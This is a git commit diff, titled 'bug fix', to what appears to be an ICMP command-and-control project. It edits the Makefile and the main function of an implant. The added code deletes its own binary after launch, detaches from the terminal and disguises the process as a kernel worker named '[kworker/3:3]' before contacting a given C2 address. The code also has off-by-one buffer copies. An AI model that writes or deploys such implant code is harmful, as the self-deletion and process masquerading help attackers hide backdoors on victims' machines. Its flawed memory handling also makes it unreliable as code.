4521d8a702904e99d2e6481524516313fa21494d
g0rchy <92731777+g0rchy@users.noreply.github.com>
2023-01-22 19:32:36 +0100

    bug fix

--- Makefile
+++ Makefile
@@ -2,7 +2,7 @@ OUTDIR = ./bin
 SRCDIR = ./src
 OBJDIR = ./obj
 CC = gcc
-CFLAGS = -Wall -Werror -D_FORTIFY_SOURCE=2 -s -I/usr/include/openssl/ -L/usr/lib/
+CFLAGS = -Wall -Werror -D_FORTIFY_SOURCE=2 -s -lssl
 
 all: icmp-c2 icmp-implant
 
--- src/icmp-implant.c
+++ src/icmp-implant.c
@@ -2,29 +2,27 @@
 
 int main(int argc, char **argv) {
     if (argc < 2) {
-        fprintf(stderr, "Error: Specify the IP address to connect to as an argument\n");
+        fprintf(stderr, "Usage: ./icmp-implant [IP-ADDRESS]");
         return 1;
-    } else if (argc == 1) {
-        char target[strlen(argv[1])];
-        memmove(target, argv[1], strlen(target));
-
-        // remove implant upon execution
-        unlink(argv[0]);
-
-        // detach from tty to impersonate a daemon
-        ioctl(0, TIOCNOTTY);
-
-        // save the arg for later
-        memmove(target, argv[1], strlen(argv[1]) + 1);
-
-        // process masquerading, change the command name associated with the process (/proc/<pid>/comm)
-        prctl(PR_SET_NAME, "[kworker/3:3]", NULL, NULL, NULL);
-        memmove(argv[0], "[kworker/3:3]", strlen(argv[0]) + 1);
-        memmove(argv[1], "\0", strlen(argv[1]));
-
-        implant_init_n_call(target);
-    } else {
-        fprintf(stdout, "Usage: ./icmp-implant [IP-ADDRESS]");
     }
+    size_t ip_len = strlen(argv[1]);
+    char target[ip_len];
+    memmove(target, argv[1], ip_len);
+
+    // remove implant upon execution
+    unlink(argv[0]);
+
+    // detach from tty to impersonate a daemon
+    ioctl(0, TIOCNOTTY);
+
+    // save the arg for later
+    memmove(target, argv[1], ip_len + 1);
+
+    // process masquerading, change the command name associated with the process (/proc/<pid>/comm)
+    prctl(PR_SET_NAME, "[kworker/3:3]", NULL, NULL, NULL);
+    memmove(argv[0], "[kworker/3:3]", ip_len + 1);
+    memmove(argv[1], "\0", ip_len);
+
+    implant_init_n_call(target);
     return 0;
 }
